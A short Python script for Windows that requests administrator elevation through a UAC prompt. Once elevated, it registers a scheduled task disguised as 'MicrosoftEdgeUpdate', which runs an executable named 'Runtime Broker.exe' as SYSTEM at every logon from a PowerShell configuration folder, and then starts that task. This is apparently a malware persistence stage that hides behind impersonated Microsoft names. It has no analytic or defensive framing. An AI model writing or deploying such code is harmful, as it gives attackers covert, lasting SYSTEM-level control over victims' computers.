import os
import ctypes, sys

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if is_admin():
    path = "\"C:\Program Files\WindowsPowerShell\Configuration\Runtime Broker.exe\""
    command = "schtasks /create /sc ONLOGON /tn MicrosoftEdgeUpdate /tr " + path + " /ru \"SYSTEM\""
    p = os.popen(command)
    command = "schtasks /run /tn \"MicrosoftEdgeUpdate\""
    p = os.popen(command)

else:
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv[1:]), None, 1)

